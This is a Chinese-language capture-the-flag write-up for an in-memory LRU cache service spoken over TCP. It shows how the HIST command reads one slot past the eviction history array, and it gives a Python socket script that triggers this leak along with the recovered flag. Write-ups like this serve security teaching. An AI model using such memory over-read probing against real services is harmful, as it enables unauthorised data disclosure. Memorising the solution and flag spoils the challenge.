## 题目原文

> 一个基于 TCP 行协议的内存 LRU 缓存服务，支持键值对的存取、容量淘汰与历史查看。请分析其实现，找出可利用的内存安全缺陷并读取受保护的 flag。

## 题解

### 入口与指纹

TCP 横幅是 `200 lrud ready`。命令有 `PUT <key> <value>`、`GET <key>`、`SIZE`、`PEEK`、`HIST`。`HIST` 的说明是按最近淘汰的顺序显示历史。

### 关键观察

`SIZE` 在放入 12 条之后是 8，所以缓存容量是 8，多出来的 4 条被淘汰。`PEEK` 只给最近被淘汰的那一条，这里是 `v3`。`HIST` 却打出 5 行：`v3`、`v2`、`v1`、`v0`，然后是 flag。

真实淘汰只有 4 条。第 5 行不是历史记录，是历史数组后面的相邻内存。

### 利用链

```bash
T=$(head -1 .target)
python3 - << PY
import socket
host, port = "$T".rsplit(":", 1)
s = socket.create_connection((host, int(port)), 6)
s.settimeout(2)
def rec():
    s.settimeout(0.4)
    buf=b""
    while True:
        try:
            c=s.recv(4096)
            if not c: break
            buf += c
        except socket.timeout:
            break
    return buf
rec()
for i in range(12):
    s.sendall(f"PUT k{i} v{i}\\n".encode())
    rec()
s.sendall(b"HIST\\n")
print(rec())
PY
```

本次平台接受的值是 `flag{9c0043f1-568a-474d-8d8f-a55662074209}`，出现在 `HIST` 的 `[4]`。

### flag 位置

淘汰历史数组后面的相邻内存。`HIST` 多读了一格，把 flag 当成一条历史打出来。
